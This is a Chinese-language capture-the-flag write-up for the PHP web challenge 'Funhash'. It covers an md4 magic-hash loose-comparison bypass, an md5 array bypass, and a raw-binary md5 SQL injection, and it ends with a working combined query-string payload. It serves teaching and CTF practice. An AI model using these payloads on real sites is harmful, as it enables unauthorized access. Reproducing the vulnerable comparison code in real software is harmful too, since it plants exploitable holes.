# Funhash

> 分类：Web

## 题目描述

三关 hash 绕过（md4、md5 数组、md5 原始二进制 SQL 注入）。

## 考察知识点

- PHP md4/md5 弱类型
- md5 数组绕过
- md5($str, true) 原始二进制 SQL 注入

## 解法

**Level 1**：

```php
if ($_GET["hash1"] != hash("md4", $_GET["hash1"])) die('level 1 failed');
```

需 hash1 值等于自身 md4 值，用 0e 开头的字符串 `0e251288019`（md4 后也是 0e 开头，科学计数法比较为 0）。

**Level 2**：

```php
if ($_GET['hash2'] === $_GET['hash3'] || md5($_GET['hash2']) !== md5($_GET['hash3'])) die('level 2 failed');
```

用数组绕过：`hash2[]=1&hash3[]=2`（md5(数组) 返回 null）。

**Level 3**：

```php
$query = "SELECT * FROM flag WHERE password = '" . md5($_GET["hash4"], true) . "'";
```

md5 原始二进制 SQL 注入，用 `ffifdyop`（其 md5 原始二进制包含 `'or'` 绕过）。

最终 payload：

```
?hash1=0e251288019&hash2[]=1&hash3[]=2&hash4=ffifdyop
```

## 参考答案

（flag 通过三关 hash 绕过后 SQL 查询返回）

## 来源

- 作者：一叶飘零 | https://www.4hou.com/posts/yMvW
- 作者：洛柒尘 | https://blog.csdn.net/ewyherayh/article/details/108192265
